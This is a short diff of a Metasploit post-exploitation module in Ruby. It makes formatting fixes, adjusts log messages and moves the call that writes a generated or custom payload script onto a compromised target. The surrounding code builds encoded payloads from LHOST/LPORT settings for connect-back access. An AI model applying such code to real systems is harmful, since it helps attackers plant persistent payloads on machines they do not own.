@@ -122,7 +122,7 @@ class Metasploit3 < Msf::Post
 				return
 			end
 
-			if !lport.between?(1,65535)
+			if !lport.between?(1, 65535)
 				print_error("Please set LPORT")
 				return
 			end
@@ -146,7 +146,7 @@ class Metasploit3 < Msf::Post
 			end
 		elsif action == 'CUSTOM' or action == 'REXE'   # REXE - legacy
 			action = 'CUSTOM'
-			print_status("Action: CUSTOM (using a custom binary)")
+			print_status("Action: CUSTOM (using a custom binary: #{rexe})")
 
 			if rexe.nil? or rexe.empty?
 				print_error("Please set REXE")
@@ -176,13 +176,14 @@ class Metasploit3 < Msf::Post
 		# Create/load payload
 		if action == 'MSF'
 			pay = create_payload(payload, lhost, lport, opts = "")
-			raw = pay_gen(pay,encoder, iterations)
+			raw = pay_gen(pay, encoder, iterations)
 			script = create_script(delay, template, raw)
+			script_on_target = write_to_target(script, path, rexename)
 		else
 			raw = create_payload_from_file(rexe)
+			script_on_target = write_to_target(raw, path, rexename)
 		end
 
-		script_on_target = write_to_target(raw, path, rexename)
 		if not script_on_target
 			print_error("Stopping...")
 			return
@@ -444,7 +445,7 @@ class Metasploit3 < Msf::Post
 	# Function to read in custom binary
 	#-------------------------------------------------------------------------------
 	def create_payload_from_file(filein)
-		print_status("Using #{filein} as the payload")
+		print_status("Using #{filein} as the payload") if datastore['VERBOSE']
 		return ::IO.read(filein)
 	end
 end
